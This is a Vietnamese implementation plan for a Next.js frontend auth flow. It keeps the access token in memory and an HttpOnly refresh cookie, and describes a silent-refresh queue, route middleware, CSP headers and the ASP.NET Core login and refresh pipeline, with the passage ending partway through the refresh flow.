# Kế Hoạch Triển Khai — Auth Flow (Option B)

**Phương án**: Memory Access Token + HttpOnly Refresh Token  
**Mục tiêu**: Sửa luồng login để lưu user data, tự động refresh token, bảo vệ route  
**Thời gian**: ~4-6 giờ (chỉ Frontend)

---

## Mục Lục

1. [Trả Lời Câu Hỏi Về Endpoint `/api/user/me`](#1-trả-lời-về-endpoint-apiuserme)
2. [Kiến Trúc Tổng Quan](#2-kiến-trúc-tổng-quan)
3. [Các Phase Triển Khai](#3-các-phase-triển-khai)
4. [Flow Chi Tiết FE ↔ BE](#4-flow-chi-tiết-fe--be)
5. [File-By-File Patch List](#5-file-by-file-patch-list)
6. [Danh Sách File Cần Tạo/Sửa](#6-danh-sách-file-cần-tạosửa)
7. [Luồng Dữ Liệu Chi Tiết (FE → BE → FE)](#7-luồng-dữ-liệu-chi-tiết-fe--be--fe)
8. [So Sánh Bảo Mật: Current vs Option B](#8-so-sánh-bảo-mật-current-localstorage-vs-option-b-ram--httponly)
9. [Phân Tích Hiệu Suất Silent Refresh](#9-phân-tích-hiệu-suất-silent-refresh-qa)
10. [Cấu Trúc Thư Mục Sau Khi Hoàn Thành](#10-cấu-trúc-thư-mục-sau-khi-hoàn-thành)

---

## 1. Trả Lời Về Endpoint `/api/user/me`

### Vấn đề

Bạn đã chuyển từ `/api/auth/me` sang `/api/user/me`. Câu hỏi: có được không?

### Phân tích từ Backend Convention

| Convention | File | Dòng |
|-----------|------|------|
| `AuthController` → `[Route("api/auth")]` | `01_BACKEND_ARCHITECTURE.md` | 610-611 |
| `UserController` → `[Route("api/users")]` | `01_BACKEND_ARCHITECTURE.md` | 610-611 |

**HIỆN TẠI:**
- `AuthController`: route `/api/auth` → các endpoint: `login`, `register`, `refresh-token`, `logout`
- `UserController`: route `/api/users` → **đã bị comment hết** (01_ARCH:198)

### Khuyến nghị

| Endpoint | Phù hợp? | Ghi chú |
|----------|----------|---------|
| `GET /api/auth/me` | ✅ **Khuyến nghị** | Thuộc về xác thực, thêm vào `AuthController`. Backend convention `AuthController` dùng cho mọi thứ liên quan auth. |
| `GET /api/users/me` | ⚠️ Có thể dùng | Cần uncomment `UserController` + thêm action. Route theo convention là `/api/users/me`. |
| `GET /api/user/me` | ❌ **Lệch convention** | Backend không có route `/api/user` (số ít). Tất cả controller dùng số nhiều: `/api/auth`, `/api/users`. |

**Kết luận:**
- **Tốt nhất**: `GET /api/auth/me` — thêm vào `AuthController`, 1 dòng code backend
- **Chấp nhận được**: `GET /api/users/me` — thêm vào `UserController` đã có
- **Không nên**: `GET /api/user/me` — lệch convention, cần custom route riêng

> **Nếu bạn muốn dùng `/api/user/me` thì backend cần set route tường minh:**
> ```csharp
> [HttpGet("/api/user/me")]
> public async Task<ActionResult<UserProfileDto>> GetCurrentUser() { ... }
> ```

---

## 2. Kiến Trúc Tổng Quan

### Sơ đồ luồng dữ liệu

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        FRONTEND (Next.js 16)                           │
│                                                                         │
│  ┌────────────────────────────────────────────────────────────────┐    │
│  │                    Zustand Auth Store (RAM)                     │    │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────┐  │    │
│  │  │ token    │  │ user     │  │ isLoading│  │ isRefreshing │  │    │
│  │  │ (string) │  │ (User)   │  │ (bool)   │  │ (bool)       │  │    │
│  │  └──────────┘  └──────────┘  └──────────┘  └──────────────┘  │    │
│  └────────────────────────────────────────────────────────────────┘    │
│                              │                                          │
│          ┌───────────────────┼──────────────────────┐                   │
│          ▼                   ▼                      ▼                   │
│  ┌──────────────┐  ┌──────────────┐  ┌────────────────────────┐       │
│  │ Axios Req    │  │ Silent       │  │ Next.js Middleware     │       │
│  │ Interceptor  │  │ Refresh Hook │  │ (Route Guard)         │       │
│  │ Bearer+CSRF  │  │ (useAuth)    │  │ /dashboard → check    │       │
│  └──────────────┘  └──────────────┘  └────────────────────────┘       │
└─────────────────────────────────────────────────────────────────────────┘
                              │
            Browser tự gửi cookies (HttpOnly)
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                    BACKEND (ASP.NET Core 10)                            │
│                                                                         │
│  Middleware Pipeline:                                                    │
│  Exception → CORS → HTTPS → SecureHeaders → CookiePolicy                │
│  → Authentication (JWT) → CSRF (skip auth) → Authorization → Controller│
│                                                                         │
│  ┌─────────────┐    ┌────────────────┐    ┌──────────────────────┐     │
│  │ POST /login │    │ POST /refresh  │    │ GET /api/auth/me     │     │
│  │ → JWT+      │    │ → Cookie→DB   │    │ → JWT→Claims→User   │     │
│  │   Cookies   │    │   Rotation     │    │   Profile Query     │     │
│  └─────────────┘    └────────────────┘    └──────────────────────┘     │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 3. Các Phase Triển Khai

### Phase 0: Backend Dependency (CẦN TRƯỚC)

| # | Công việc | File/Endpoint | Ghi chú |
|---|-----------|--------------|---------|
| P0.1 | Tạo endpoint `/api/auth/me` | `AuthController.cs` | GET, trả về `UserProfileDto` từ JWT claims `nameid` |
| P0.2 | Tạo `GetCurrentUserQuery` | `AuthApi.Application/Features/Auth/Queries/GetCurrentUser/` | Query + Handler + DTO |
| P0.3 | Tạo `UserQueryRepository.GetByIdAsync()` | `UserQueryRepository.cs` | Query SQL Server bằng Dapper/SqlKata |

**Response mong đợi:**
```json
{
  "id": "guid",
  "email": "user@example.com",
  "firstName": "Nguyen",
  "lastName": "Thanh Tuan",
  "role": "User",
  "avatar": null
}
```

---

### Phase 1: Zustand Auth Store (Core)

**Mục tiêu**: Tạo store trung tâm quản lý auth state trong RAM

| Task | File | Action |
|------|------|--------|
| 1.1 | `src/shared/stores/auth-store.ts` | CREATE |

**Tech stack**: Zustand (đã cài trong `package.json` nhưng chưa dùng)

**Store interface:**
```typescript
interface AuthState {
  // State (RAM only)
  token: string | null
  user: User | null
  isAuthenticated: boolean
  isLoading: boolean
  isRefreshing: boolean
  
  // Actions
  setToken: (token: string) => void
  setUser: (user: User | null) => void
  login: (token: string, user: User) => void
  logout: () => void
  setLoading: (loading: boolean) => void
  setRefreshing: (refreshing: boolean) => void
}
```

**Quy tắc:**
- `token` → KHÔNG persist (chỉ RAM)
- Token mất khi refresh page → silent refresh sẽ lấy lại
- `user` → có thể persist nhẹ (firstName, lastName) để hiển thị ngay, nhưng vẫn fetch `/me` để validate

---

### Phase 2: Axios Interceptor (Gắn Token + Auto Refresh)

**Mục tiêu**: Tự động gắn Bearer token, tự động refresh khi 401

| Task | File | Action |
|------|------|--------|
| 2.1 | `src/shared/api/index.ts` | EDIT |

**Kiến trúc tổng thể — shared `performRefresh()`:**

Cả interceptor (khi 401) và hook (khi mount) đều gọi chung 1 function `performRefresh()`:

```
┌──────────────────────────────────────────────────────────────────┐
│                    performRefresh()                              │
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  isRefreshing = true?                                    │    │
│  │    ├── YES → QUEUE (return Promise chờ resolve)          │    │
│  │    │         → Promise treo trong failedQueue[]          │    │
│  │    │         → Khi refresh xong, processQueue resolve    │    │
│  │    │         → Promise trả về token mới                  │    │
│  │    │                                                     │    │
│  │    └── NO  → isRefreshing = true                         │    │
│  │               → POST /refresh-token (cookie HttpOnly)    │    │
│  │               → setToken(newToken) vào Zustand           │    │
│  │               → processQueue(null, newToken) flush queue │    │
│  │               → return newToken                          │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                  │
│  NẾU LỖI: processQueue(error) → logout() → reject              │
│  CUỐI CÙNG: isRefreshing = false                               │
└──────────────────────────────────────────────────────────────────┘
         ▲                              ▲
         │                              │
  ┌──────┴──────┐              ┌────────┴────────┐
  │  useAuth()  │              │ Response Interceptor
  │  (hook)     │              │ (401 handler)
  │             │              │
  │  Mount app  │              │  API call → 401
  │  token null │              │  → gọi performRefresh()
  │  → gọi      │              │  → retry với token mới
  │  performRef.│              └─────────────────┘
  └─────────────┘
```

**Request interceptor:**
```typescript
// 1. Gắn Bearer token từ Zustand RAM (trừ /refresh-token)
// 2. Gắn CSRF token chỉ cho POST/PUT/PATCH/DELETE
```

**Response interceptor (401 → gọi `performRefresh()`):**
```typescript
// 1. Nhận 401 (bỏ qua /refresh-token, bỏ qua đã _retry)
// 2. Gọi performRefresh()
//    → Nếu có ai đang refresh → queue (Promise treo)
//    → Nếu chưa ai refresh → tự refresh
// 3. Refresh success → retry request gốc với Bearer mới
// 4. Refresh fail → performRefresh đã logout + redirect
```

**Queue mechanism:**
```typescript
let failedQueue: FailedRequest[] = []  // [{ resolve, reject }]
let isRefreshing = false               // guard

function processQueue(error, token) {
  // Copy + clear queue trước khi loop (tránh infinite nếu reject/resolve gây thêm queue)
  const queue = [...failedQueue]
  failedQueue = []
  queue.forEach(({ resolve, reject }) => {
    if (error) reject(error)
    else resolve(token)
  })
}
```

---

### Phase 3: Silent Refresh Hook

**Mục tiêu**: Khi app mount / refresh page, tự động lấy lại access token

| Task | File | Action |
|------|------|--------|
| 3.1 | `src/shared/hooks/useAuth.ts` | CREATE |

**Hook logic:**

```typescript
function useAuth() {
  const token = useAuthStore((s) => s.token)
  const user = useAuthStore((s) => s.user)
  const isLoading = useAuthStore((s) => s.isLoading)
  const setUser = useAuthStore((s) => s.setUser)
  const setLoading = useAuthStore((s) => s.setLoading)

  useEffect(() => {
    let cancelled = false

    async function hydrate() {
      if (token) { setLoading(false); return }  // SPA navigate

      try {
        // Step 1: Gọi shared performRefresh() — dùng chung với interceptor
        const newToken = await performRefresh()
        if (cancelled) return

        // Step 2: Fetch user profile GET /api/auth/me
        const { data: meData } = await axios.get(
          `${config.apiBaseUrl}/auth/me`,
          {
            headers: { Authorization: `Bearer ${newToken}` },
            withCredentials: true,
          }
        )
        if (cancelled) return

        // Step 3: Map BE response → User interface
        const profile = mapUserFromMeResponse(meData)
        setUser(profile)
      } catch {
        // performRefresh() đã logout nếu refresh fail
      } finally {
        if (!cancelled) setLoading(false)
      }
    }

    hydrate()
    return () => { cancelled = true }
  }, [])

  return { user, token, isLoading, isAuthenticated: !!user }
}
```

**Tại sao dùng `performRefresh()` thay vì tự gọi axios?**
- Tránh race condition với interceptor (cả 2 cùng refresh 1 lúc)
- Queue thống nhất (interceptor queue request nếu hook đang refresh)
- isRefreshing flag đồng bộ (UI có thể dùng để show loading)

**`mapUserFromMeResponse` mapping:**
| BE Response `MeResponse` | Zustand `User` |
|--------------------------|---------------|
| `id` | `id` |
| `email` | `email` |
| `firstName + lastName` | `name` (join " " hoặc email nếu null) |
| `roles[0]` | `role` |
| `avatar` | `avatar` |

---

### Phase 4: Next.js Middleware (Route Guard)

**Mục tiêu**: Chặn truy cập vào protected routes nếu chưa login

| Task | File | Action |
|------|------|--------|
| 4.1 | `src/middleware.ts` | CREATE |

**Logic:**
```typescript
// Middleware chạy ở Edge, không có Zustand, không có localStorage
// Giải pháp: kiểm tra cookie refreshToken (HttpOnly do BE set)
// Nếu có cookie → allow (silent refresh sẽ hydrate ở client)
// Nếu không → redirect /login

export function middleware(request: NextRequest) {
  const refreshToken = request.cookies.get('refreshToken')
  const { pathname } = request.nextUrl

  // Protected routes
  if (pathname.startsWith('/dashboard') || pathname.startsWith('/trips') || pathname.startsWith('/profile')) {
    if (!refreshToken) {
      return NextResponse.redirect(new URL('/login', request.url))
    }
  }

  // Auth routes (đã login thì không vào login page)
  if (pathname.startsWith('/login') || pathname.startsWith('/register')) {
    if (refreshToken) {
      return NextResponse.redirect(new URL('/dashboard', request.url))
    }
  }

  return NextResponse.next()
}
```

> **Note**: Middleware chỉ check cookie refreshToken có tồn tại, KHÔNG validate signature (không thể decode HttpOnly cookie ở Edge). Validate thật sẽ được silent refresh hook xử lý ở client.

---

### Phase 5: Login Flow Update

**Mục tiêu**: Sửa useLoginForm để lưu token vào Zustand (không localStorage)

| Task | File | Action |
|------|------|--------|
| 5.1 | `src/features/auth/hooks/login/useLoginForm.ts` | EDIT |
| 5.2 | `src/features/auth/hooks/login/useLogin.ts` | EDIT |

**Thay đổi chính:**
```typescript
// OLD: useAuth() context → localStorage
const { login } = useAuth()  // Context

// NEW: useAuthStore() → RAM
const login = useAuthStore((state) => state.login)

const onSubmit = async (data) => {
  const result = await mutation.mutateAsync(data)

  // Lưu token vào Zustand RAM (không localStorage)
  login(
    result.accessToken!,
    {
      id: result.userId!,
      email: result.email!,
      name: result.email!.split('@')[0], // hoặc firstName + lastName từ response
      role: result.role!,
    }
  )

  onSuccess?.()
}
```

---

### Phase 6: AuthProvider Deprecation (Compat Layer)

**Mục tiêu**: Giữ backward compatibility, dần chuyển qua Zustand

| Task | File | Action |
|------|------|--------|
| 6.1 | `src/shared/components/providers/AuthProvider/auth-provider.tsx` | EDIT |
| 6.2 | `src/app/provider.tsx` | EDIT (optional) |
| 6.3 | `src/shared/components/providers/index.ts` | EDIT |

**Cách làm:** AuthProvider cũ → wrapper gọi Zustand store:
```typescript
const AuthProvider = ({ children }) => {
  const { user, isLoading } = useAuthStore()
  // ... vẫn expose useContext như cũ nhưng data từ Zustand
  return <AuthContext.Provider value={...}>{children}</AuthContext.Provider>
}
```

Sau này khi tất cả component đã migrate sang `useAuthStore()` trực tiếp, xóa hẳn AuthProvider.

---

### Phase 7: Dashboard Realtime Data

**Mục tiêu**: Dashboard hiển thị tên user thật (không hardcode "Tuấn")

| Task | File | Action |
|------|------|--------|
| 7.1 | `src/features/dashboard/components/WelcomeHero/WelcomeHero.tsx` | EDIT |
| 7.2 | `src/app/(main)/dashboard/page.tsx` | EDIT |

```typescript
// WelcomeHero.tsx
function WelcomeHero() {
  const user = useAuthStore((s) => s.user)
  const firstName = user?.firstName || user?.name || 'bạn'

  return (
    <h1>Chào {new Date().getHours() < 12 ? 'sáng' : 'mừng'}, {firstName}!</h1>
  )
}
```

---

### Phase 8: Security Hardening

**Mục tiêu**: CSP headers, CSRF chỉ cho mutating requests

| Task | File | Action |
|------|------|--------|
| 8.1 | `src/shared/api/index.ts` | EDIT (CSRF condition) |
| 8.2 | `next.config.ts` | EDIT (CSP headers) |

**CSP trong next.config.ts:**
```typescript
const nextConfig: NextConfig = {
  async headers() {
    return [{
      source: '/(.*)',
      headers: [{
        key: 'Content-Security-Policy',
        value: "script-src 'self'; connect-src 'self' https://localhost:7160; frame-ancestors 'none'",
      }],
    }]
  }
}
```

---

## 4. Flow Chi Tiết FE ↔ BE

### Flow 1: Login

```
FE (useLoginForm)                           BE (AuthController)
┌──────────────────────┐                   ┌─────────────────────┐
│ POST /api/auth/login │ ──────────────────→ │                     │
│ {email, password}    │                   │ 1. Find user by email│
└──────────────────────┘                   │ 2. Check lockout     │
                                           │ 3. Check EmailConfirm│
                                           │ 4. Verify password   │
                                           │ 5. Generate JWT (15m)│
                                           │ 6. Generate Refresh  │
                                           │    Token (30d)       │
                                           │ 7. Save Refresh to DB│
                                           │ 8. Set cookies:      │
                                           │    - refreshToken    │
                                           │      (HttpOnly)      │
                                           │    - CSRF-TOKEN      │
                                           │      (non-HttpOnly)  │
                                           │                     │
←──────────────────────────────────────── │ 9. Response 200      │
{accessToken, expired, userId,             │    {accessToken, ...}│
 email, role}                              └─────────────────────┘
│
▼
FE:
1. useAuthStore.login(accessToken, user)
   → token lưu RAM (Zustand)
   → user lưu RAM (Zustand)
2. Axios interceptor từ giờ sẽ gắn Bearer header
3. router.push('/dashboard')
```

### Flow 2: Silent Refresh (App Mount / F5)

```
FE (useAuth hook mount)                     BE (AuthController)
┌──────────────────────┐                   ┌─────────────────────┐
│ POST /api/auth/      │ ──────────────────→ │                     │
│ refresh-token        │                   │ 1. Read cookie:      │
│ (browser tự gửi      │                   │    refreshToken      │
│  cookie HttpOnly)    │                   │ 2. Find in DB        │
└──────────────────────┘                   │ 3. Validate:         │
                                           │    - not expired     │
                                           │    - not revoked     │
                                           │ 4. Revoke old token  │
                                           │ 5. Generate new pair │
                                           │ 6. Save new to DB    │
                                           │ 7. Set new cookies   │
                                           │                     │
←──────────────────────────────────────── │ 8. Response 200      │
{accessToken, expiredAt}                    │    {accessToken, ...}│
└─────────────────────┘
│
▼
FE:
1. useAuthStore.setToken(newAccessToken)
2. Gọi GET /api/auth/me (có Bearer header)

FE (Axios với Bearer)                       BE (AuthController)
┌──────────────────────┐                   ┌─────────────────────┐
│ GET /api/auth/me     │ ──────────────────→ │ Middleware:         │
│ Authorization: Bearer│                   │ 1. Auth: Validate   │
│ <accessToken>        │                   │    JWT signature,   │
└──────────────────────┘                   │    iss, aud, exp    │
                                           │ 2. CSRF: SKIP (GET) │
                                           │ 3. Controller:      │
                                           │    decode Claims    │
                                           │    → nameid (userId)│
                                           │    → query DB       │
                                           │    → return profile │
                                           │                     │
←──────────────────────────────────────── │ Response 200         │
{id, email, firstName,                     │ {id, email,         │
 lastName, role, avatar}                    │  firstName, ...}    │
│
▼
FE:
1. useAuthStore.setUser(profile)
2. Dashboard hiển thị "Chào sáng, Tuan!"
3. isLoading = false → user thấy UI
```

### Flow 3: API Call 401 → Auto Refresh

```
FE (Axios)                                  BE
┌──────────────────────┐                   ┌─────────────────────┐
│ POST /api/transactions│ ─────────────────→ │ 1. Auth: JWT hết  │
│ Authorization: Bearer │                   │    hạn (15 phút)   │
│ <eyJhbGciOiJIUzI1Ni> │                   │ → 401 + Header:     │
└──────────────────────┘                   │   Token-Expired:true│
                                            │                     │
←── 401 (Token-Expired) ────────────────── │                     │
│
▼
FE (response interceptor tại dòng 104-133 src/shared/api/index.ts):

  error = AxiosError { response: { status: 401, headers: { 'token-expired': 'true' } } }
  originalRequest = { url: '/api/transactions', headers: { Authorization: 'Bearer eyJ...' }, _retry: false }
  isRefreshing = false

  // Guard 1: bỏ qua nếu URL là /refresh-token → không (tiếp)
  // Guard 2: bỏ qua nếu _retry = true → không (tiếp)

  originalRequest._retry = true  // đánh dấu đã retry

  → GỌI performRefresh()  (dòng 59-81)
      │
      ├── isRefreshing = false → set isRefreshing = true
      │                         setRefreshing(true) vào Zustand
      │
      ├── callRefreshApi() → axios.post('https://localhost:7160/api/auth/refresh-token', {}, { withCredentials: true })
      │                       → Browser tự gửi cookie: refreshToken=abc123...
      │                       → Đây là axios RIÊNG (không client.instance) — tránh vòng lặp interceptor
      │
      ├── [THÀNH CÔNG] ← { accessToken: "eyJhbGciOiJIUzI1NiJ9..." }
      │   → useAuthStore.getState().setToken("eyJhbGciOiJIUzI1NiJ9...")
      │   → processQueue(null, "eyJhbGciOiJIUzI1NiJ9...")
      │     └── failedQueue = [] (không ai queue)
      │   → return "eyJhbGciOiJIUzI1NiJ9..."
      │
      └── [THẤT BẠI] ← 400 (refresh token hết hạn)
          → processQueue(Error, null)
          → useAuthStore.getState().logout()
            └── Zustand: token=null, user=null, isAuthenticated=false
          → throw Error
          → redirect /login

  ← có newToken = "eyJhbGciOiJIUzI1NiJ9..."

  originalRequest.headers.Authorization = "Bearer eyJhbGciOiJIUzI1NiJ9..."
  → Retry POST /api/transactions với Bearer MỚI

  isRefreshing = false  (finally block)

================================================================

CASE 2: 2 request song song (GET /trips + GET /profile cùng 401)

  Time 0ms:   GET /trips → 401
              interceptor: isRefreshing = false → performRefresh()
              → isRefreshing = true

  Time 1ms:   GET /profile → 401
              interceptor: isRefreshing = true → QUEUE
              → return new Promise((resolve) => { failedQueue.push({ resolve }) })
              → Promise treo

  Time 500ms: performRefresh xong
              → setToken(newToken)
              → processQueue(null, newToken)
                └── failedQueue = [{ resolve: resolveFn }]
                └── resolveFn(newToken)  → Promise token resolve
                    → GET /profile retry với Bearer mới → 200
              → GET /trips retry với Bearer mới → 200

  Kết quả: cả 2 request đều 200, user không thấy lỗi
```

### Flow 4: Logout

```
FE                                       BE
┌──────────────────────┐                ┌─────────────────────┐
│ POST /api/auth/logout│ ──────────────→ │ 1. Read cookie      │
│ X-CSRF-TOKEN: <val>  │                │    refreshToken      │
└──────────────────────┘                │ 2. Find in DB        │
                                        │ 3. Set IsRevoked=TRUE│
                                        │ 4. Save to DB        │
                                        │ 5. Clear cookies:    │
                                        │    - refreshToken: ''│
                                        │    - CSRF-TOKEN: ''  │
                                        │                     │
←────────────────────────────────────── │ Response 200         │
│
▼
FE:
1. useAuthStore.logout()
   → token = null, user = null
2. router.push('/login')
```

---

## 5. File-By-File Patch List

### 5.1 Đã Tạo (2 files)

| # | File Path | Nội dung | Trạng thái |
|---|-----------|----------|-----------|
| 1 | `src/shared/stores/auth-store.ts` | Zustand store, RAM-only token, user state + actions | ✅ **DONE** |
| 2 | `src/shared/hooks/useAuth.ts` | Custom hook gọi Zustand, silent refresh on mount (dùng `performRefresh()` từ api/index.ts) | ✅ **DONE** |

### 5.2 Đã Sửa (2 files)

| # | File Path | Nội dung thay đổi | Trạng thái |
|---|-----------|-------------------|-----------|
| 3 | `src/shared/api/index.ts` | Request: gắn Bearer từ Zustand + CSRF chỉ cho mutating. Response: 401 → `performRefresh()` shared (exported). Queue + isRefreshing guard. | ✅ **DONE** |
| 4 | `src/features/auth/hooks/login/useLoginForm.ts` | Thay `useAuth()` context → `useAuthStore().login()`. Fix `result.role` → `result.roles?.[0]`. | ✅ **DONE** |

### 5.3 Chưa Làm (sẽ làm sau)

| # | File Path | Nội dung thay đổi |
|---|-----------|-------------------|
| 5 | `src/features/auth/hooks/login/useLogin.ts` | Đảm bảo mutation return type đúng (LoginResponse) |
| 6 | `src/middleware.ts` | Next.js Edge middleware: check refreshToken cookie cho route guard |
| 7 | `src/shared/components/providers/AuthProvider/auth-provider.tsx` | Refactor thành compat layer gọi Zustand (không dùng localStorage nữa) |
| 8 | `src/app/provider.tsx` | Giữ nguyên hoặc bỏ AuthProvider |
| 9 | `src/shared/components/providers/index.ts` | Cập nhật exports nếu cần |
| 10 | `src/features/dashboard/components/WelcomeHero/WelcomeHero.tsx` | Dùng `useAuthStore()` lấy user.name |
| 11 | `src/app/(main)/dashboard/page.tsx` | Fetch auth profile khi mount |
| 12 | `next.config.ts` | Thêm CSP headers security |

### 5.4 Thứ Tự Thực Hiện (cập nhật)

```
Phase 1: auth-store.ts (Zustand store)                    → ✅ DONE
    │
    ▼
Phase 2: api/index.ts (shared performRefresh + queue)     → ✅ DONE
    │                                        (phải làm trước useAuth vì useAuth import performRefresh)
    ▼
Phase 3: useAuth.ts (silent refresh hook)                 → ✅ DONE
    │
    ▼
Phase 4: middleware.ts (route guard)                      → ⬜ PENDING
    │
    ▼
Phase 5: useLoginForm.ts + useLogin.ts (login flow)       → 🔄 PARTIAL (useLoginForm done)
    │
    ▼
Phase 6: AuthProvider compat (backward compat)            → ⬜ PENDING
    │
    ▼
Phase 7: WelcomeHero + Dashboard                          → ⬜ PENDING
    │
    ▼
Phase 8: next.config.ts (CSP headers)                     → ⬜ PENDING
```

---

## 6. Danh Sách File Cần Tạo/Sửa

### Tạo mới (3 files)

```
src/shared/stores/auth-store.ts          ← Zustand store (core)
src/shared/hooks/useAuth.ts              ← Auth hook + silent refresh
src/middleware.ts                         ← Route guard
```

### Chỉnh sửa (9 files)

```
src/shared/api/index.ts                  ← Interceptor + refresh queue
src/features/auth/hooks/login/useLoginForm.ts   ← Zustand thay Context
src/features/auth/hooks/login/useLogin.ts       ← Type alignment
src/shared/components/providers/AuthProvider/auth-provider.tsx  ← Compat layer
src/app/provider.tsx                     ← Optional: remove AuthProvider
src/shared/components/providers/index.ts ← Update exports
src/features/dashboard/components/WelcomeHero/WelcomeHero.tsx  ← Real user name
src/app/(main)/dashboard/page.tsx        ← Auth profile integration
next.config.ts                           ← CSP headers
```

---

## 7. Luồng Dữ Liệu Chi Tiết (FE → BE → FE)

### 7.1 Flow Login: `POST /api/auth/login`

#### Request (FE → BE)

```
Headers (FE tự động gửi):
  ┌──────────────────────────────┐
  │ Content-Type: application/json│
  │ Cookie: CSRF-TOKEN=<guid>    │  ← Cookie do BE set từ login trước hoặc từ trình duyệt
  │                              │     (Auth endpoints BYPASS CSRF, nhưng cookie vẫn gửi)
  └──────────────────────────────┘

Body:
  ┌──────────────────────────────┐
  │ {                            │
  │   "email": "user@example.com",│
  │   "password": "Abc@123456",  │
  │   "rememberMe": false        │
  │ }                            │
  └──────────────────────────────┘
```

#### Backend Xử Lý

```
Middleware Pipeline (theo thứ tự):
  1. ExceptionMiddleware        → pass (không có lỗi)
  2. HangfireDashboard          → pass (không phải /hangfire)
  3. CORS                       → check origin match Frontend:Url → pass
  4. HttpsRedirection           → pass (đã HTTPS)
  5. SecureHeadersMiddleware    → set CSP, HSTS headers
  6. CookiePolicy               → pass
  7. Authentication (JWT)       → pass (AllowAnonymous)
  8. CSRFMiddleware             → BYPASS (auth endpoint)
  9. Authorization              → pass (AllowAnonymous)
  10. MapControllers → AuthController.Login()

AuthController.Login():
  → mediator.Send(LoginCommand) 
  → LoginCommandHandler → IIdentityService.LoginAsync()
  
IdentityService.LoginAsync() (01_ARCH:366-389):
  1. UserManager.FindByEmailAsync(email)
     → Tìm trong DB bảng AspNetUsers
     → Nếu không tìm thấy → Result.Fail(ErrorCodes.InvalidCredentials)
  
  2. UserManager.IsLockedOutAsync(user)
     → Kiểm tra LockoutEnd > now
     → Nếu locked → Result.Fail(ErrorCodes.UserLockedOut)
  
  3. Kiểm tra user.EmailConfirmed
     → Nếu false → Result.Fail(ErrorCodes.EmailNotConfirmed)
  
  4. UserManager.CheckPasswordAsync(user, password)
     → Sai → UserManager.AccessFailedAsync(user) → Result.Fail(InvalidCredentials)
     → Đúng → UserManager.ResetAccessFailedCountAsync(user)
  
  5. UserManager.GetRolesAsync(user)
     → Lấy danh sách role ["User"], ["Admin"], ...
  
  6. TokenService.GenerateTokensAsync(user, roles, rememberMe)
     → Tạo JWT access token (HMAC-SHA256, TTL 15 phút)
       Claims: { nameid, email, unique_name, role[] }
     → Tạo refresh token (64-byte random base64, TTL 30 ngày)
     → Lưu RefreshToken vào DB (Token, UserId, ExpiresAt, IsRevoked=false)
  
  7. AuthCookieService.SetAuthCookies()
     → Set-Cookie: refreshToken=<base64>; HttpOnly; Secure; SameSite=None; Path=/; Max-Age=2592000
     → Set-Cookie: CSRF-TOKEN=<guid>; Secure; SameSite=None; Path=/; Max-Age=2592000
  
  8. Return LoginResponse { accessToken, expired, userId, email, role }
```

#### Response Thành Công (200)

```
Status: 200 OK
Set-Cookie: refreshToken=abc123...xyz; HttpOnly; Secure; SameSite=None; Path=/; Max-Age=2592000
Set-Cookie: CSRF-TOKEN=guid-xyz; Secure; SameSite=None; Path=/

Body:
{
  "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "expired": "2026-06-15T14:30:00Z",
  "userId": "a1b2c3d4-...",
  "email": "user@example.com",
  "role": "User"
}
```

#### FE Nhận Response → Lưu Data

```
FE nhận response 200:
  ↓
useLoginForm.onSubmit():
  1. Lấy accessToken từ response
     ↓
  2. useAuthStore.login(token, user)
     ┌──────────────────────────────────────────────────────┐
     │  Zustand Store (RAM)                                  │
     │  ┌─────────────────────────────────────────────────┐ │
     │  │ token: "eyJhbGciOiJIUzI1NiIs..."                │ │
     │  │ user: { id, email, name, role }                  │ │
     │  │ isAuthenticated: true                             │ │
     │  │ isLoading: false                                  │ │
     │  │ isRefreshing: false                               │ │
     │  └─────────────────────────────────────────────────┘ │
     │  localStorage: KHÔNG CÓ token                         │
     │  Cookie: refreshToken (HttpOnly - tự động bởi BE)     │
     │  Cookie: CSRF-TOKEN (non-HttpOnly - tự động bởi BE)   │
     └──────────────────────────────────────────────────────┘
  
  3. router.push('/dashboard')
     → Axios interceptor từ giờ sẽ gắn Bearer token cho mọi request
```

#### Response Lỗi (400/401/500)

```
Validation Error (400):
Status: 400
{
  "code": "VALIDATION_ERROR",
  "message": "Validation failed",
  "errors": {
    "Email": ["Email is required"],
    "Password": ["Password must be at least 8 characters"]
  }
}

Invalid Credentials (400):
Status: 400
{
  "code": "INVALID_CREDENTIALS",
  "message": "Invalid email or password"
}

User Locked Out (400):
Status: 400
{
  "code": "USER_LOCKED_OUT",
  "message": "User is locked out. Try again in 10 minutes"
}

Email Not Confirmed (400):
Status: 400
{
  "code": "EMAIL_NOT_CONFIRMED",
  "message": "Email is not confirmed. Please check your inbox"
}

Server Error (500):
Status: 500
{
  "code": "GENERAL_ERROR",
  "message": "An error occurred while processing your request"
}
```

→ FE hiển thị toast error tương ứng, không lưu gì vào store

---

### 7.2 Flow Silent Refresh: `POST /api/auth/refresh-token`

#### Request (FE → BE)

```
Headers:
  ┌──────────────────────────────┐
  │ Content-Type: application/json│
  │ Cookie: refreshToken=<base64> │  ← BE tự động gửi cookie này (HttpOnly)
  │ Cookie: CSRF-TOKEN=<guid>    │  ← Non-HttpOnly (FE có thể cần forward header)
  └──────────────────────────────┘
  (KHÔNG có Authorization header — chưa có access token)

Body: {} (empty)
```

#### Khi Nào Gọi?

| Tình huống | Mô tả |
|-----------|-------|
| **App mount / F5** | `useAuth` hook detect `token = null` → tự động gọi 1 lần |
| **401 từ API call** | Axios response interceptor detect 401 + `Token-Expired` header → tự động gọi |
| **Manual** | Component gọi `useAuth().refresh()` nếu cần |

#### Backend Xử Lý

```
Middleware Pipeline:
  1-6: pass (giống login)
  7. Authentication (JWT)    → SKIP (không có Bearer token)
  8. CSRFMiddleware          → BYPASS (auth endpoint trong danh sách)
  9. Authorization           → pass (AllowAnonymous)

AuthController.RefreshToken():
  → mediator.Send(RefreshTokenCommand)
  → RefreshTokenCommandHandler → TokenService.RefreshTokenAsync()

TokenService.RefreshTokenAsync() (01_ARCH:391-408):
  1. AuthCookieService.GetRefreshTokenFromCookie()
     → HttpContext.Request.Cookies["refreshToken"]
     → Nếu không có cookie → Result.Fail(ErrorCodes.UserNotFound)
  
  2. Tìm refresh token trong DB (bảng RefreshToken)
     SELECT * FROM RefreshToken WHERE Token = @token AND IsRevoked = false
